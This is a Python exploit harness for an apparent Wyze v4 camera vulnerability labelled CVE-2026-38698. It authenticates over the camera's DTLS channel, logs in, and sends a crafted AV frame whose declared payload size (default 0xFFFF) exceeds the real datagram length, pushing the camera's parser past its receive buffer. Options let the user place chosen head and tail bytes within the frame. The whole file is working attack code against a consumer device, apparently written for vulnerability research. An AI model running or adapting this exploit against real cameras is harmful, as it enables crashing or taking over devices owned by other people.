#!/usr/bin/env python3
"""Wyze v4 AV-frame injector (CVE-2026-38698 harness).

Establishes the authenticated CC51/DTLS session, logs in, and injects one raw
AV frame as DTLS application data. The declared 16-bit payload size at [16..18]
is independent of the datagram length, so an oversized declaration drives the
camera's parser past the received buffer.

Frame layout parsed by the target (28-byte header, ftype 0x01):
    [0] channel 0x07 | [1] ftype 0x01 | [12..14] pkt_total | [16..18] declared
    [24..28] frame_no | [28..] payload

Usage:
  wyze_av_probe.py --ip 192.168.4.24 --uid ... --enr ... --mac ... \
      [--declared 0xffff] [--len 1264] [--fill 41] [--tail-hex ...] \
      [--tail-off N] [--identity AUTHPWD_admin] [--psk-hex HEX] [--watch 12]

Exit status: 0 = session established and frame sent, 1 = session failed.
"""
import argparse
import os
import socket
import struct
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import dtlslib  # noqa: E402


def build_frame(args):
    n = args.len
    buf = bytearray([args.fill]) * n
    buf[0] = 0x07
    buf[1] = 0x01
    struct.pack_into("<H", buf, 12, 1)      # pkt_total
    struct.pack_into("<H", buf, 14, 0)      # idx
    struct.pack_into("<H", buf, 16, args.declared & 0xFFFF)
    struct.pack_into("<I", buf, 24, 0x11223344)
    if args.tail_hex:
        tail = bytes.fromhex(args.tail_hex.replace(":", "").replace(" ", ""))
        off = args.tail_off if args.tail_off is not None else n - len(tail)
        buf[off:off + len(tail)] = tail
    if args.head_hex:
        head = bytes.fromhex(args.head_hex.replace(":", "").replace(" ", ""))
        buf[28:28 + len(head)] = head
    return bytes(buf)


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--ip", required=True)
    p.add_argument("--uid", required=True)
    p.add_argument("--enr", default="")
    p.add_argument("--mac", required=True)
    p.add_argument("--iface", default="192.168.4.160")
    p.add_argument("--port", type=int, default=32761)
    p.add_argument("--declared", type=lambda s: int(s, 0), default=0xFFFF)
    p.add_argument("--len", type=lambda s: int(s, 0), default=1264)
    p.add_argument("--fill", type=lambda s: int(s, 0), default=0x41)
    p.add_argument("--tail-hex", default="")
    p.add_argument("--tail-off", type=lambda s: int(s, 0), default=None)
    p.add_argument("--head-hex", default="")
    p.add_argument("--identity", default="AUTHPWD_admin")
    p.add_argument("--psk-hex", default="")
    p.add_argument("--no-login", action="store_true")
    p.add_argument("--repeat", type=int, default=1)
    p.add_argument("--watch", type=float, default=10.0)
    p.add_argument("--out", default="")
    args = p.parse_args()

    if not args.enr and not args.psk_hex:
        print("need --enr or --psk-hex", file=sys.stderr)
        return 1

    cam = dtlslib.Cam2(args.ip, args.mac, args.uid, args.enr, iface=args.iface, port=args.port)
    if args.psk_hex:
        cam.psk = bytes.fromhex(args.psk_hex)
    if args.identity != "AUTHPWD_admin":
        dtlslib.IDENTITY = args.identity
    if not args.no_login:
        try:
            ok = cam.handshake()
        except Exception as exc:  # noqa: BLE001
            print(f"handshake failed: {exc}")
            return 1
        if not ok:
            print("handshake finished without server Finished")
            return 1
        print("dtls established")
        ok = cam.login()
        print("login ok" if ok else "login response not observed")
        if not ok:
            return 1
    frame = build_frame(args)
    if args.out:
        with open(args.out, "wb") as fh:
            fh.write(frame)
        print(f"frame={len(frame)}B declared=0x{args.declared:04x} -> {args.out}")
    else:
        print(f"frame={len(frame)}B declared=0x{args.declared:04x}")
    for i in range(args.repeat):
        cam.appdata(frame)
        print(f"sent {i + 1}/{args.repeat}")
        time.sleep(0.25)
    end = time.time() + args.watch
    quiet_since = None
    while time.time() < end:
        got = cam.recv_app(1.0)
        if got:
            quiet_since = None
        else:
            quiet_since = quiet_since or time.time()
    cam.s.settimeout(0.3)
    print("done")
    return 0


if __name__ == "__main__":
    sys.exit(main())
